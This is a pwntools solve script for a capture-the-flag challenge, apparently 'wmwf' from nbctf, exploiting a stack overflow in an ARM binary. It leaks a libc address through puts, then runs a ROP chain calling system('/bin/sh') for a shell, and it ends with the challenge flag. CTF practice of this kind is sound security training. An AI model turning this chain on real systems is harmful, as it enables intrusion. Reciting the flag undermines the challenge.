from pwn import *

exename             = './wmwf'
exe                 = ELF(exename)
libc                = ELF('./lib/libc.so.6')
context.binary      = exe                       # just so that it sets the endianess/arch correctly


p = gdb.debug(exename,gdbscript=f'b puts\nc')
#p = remote('chal.nbctf.com',30177)


payload_leak = b'A'*0x104
payload_leak+= p32(exe.plt.puts)
payload_leak+= p32(0x0)*0x5             #{r3, r4, r5, r6, r7, pc} inside read function  
payload_leak+= p32(exe.sym.main)



p.recvuntil(b'wheres my win function?\n')
p.sendline(payload_leak)                # execute the leak payload

"""
    once we enter the puts function in here it will have a stack pointer pointing to our payload in r0
    and since puts modifies the stack itself to store it's stack frame
    puts will add a few local variables . one of which is interesting to us bcs it's in libc executable segment
    it's probably a return address to a child function of puts . but who cares am I right xD 
    so basically puts will call strlen() first to determine the length of the string to print
    and then it starts calls write() and at this point the stack is corrupted and we have libc address inside
    and puts will gladly give it to us on a silver platter . cool beans xD
"""

ret = b''
while len(ret)<0x78:
    ret += p.clean()


libc_leak = u32(ret[0x74:0x78])
libc.address = libc_leak-0xa389f

print(f'libc_base: {hex(libc.address)}')


"""
    and now we have the libc leak and ready to create our final evil exploit
    basic ROP chain over here . nothing special . just pops /bin/sh into R0 and then calls system 
"""

#0x000e8a68 (0x000e8a69): pop {r0, pc}; 
pop_r0_pop_pc = libc.address + 0x000e8a69


payload_exploit = b'A'*0x104
payload_exploit+= p32(pop_r0_pop_pc)
payload_exploit+= p32(next(libc.search(b'/bin/sh')))
payload_exploit+= p32(libc.sym.system)

p.sendline(payload_exploit)


p.interactive()

#nbctf{thanks_for_finding_my_win_function!}
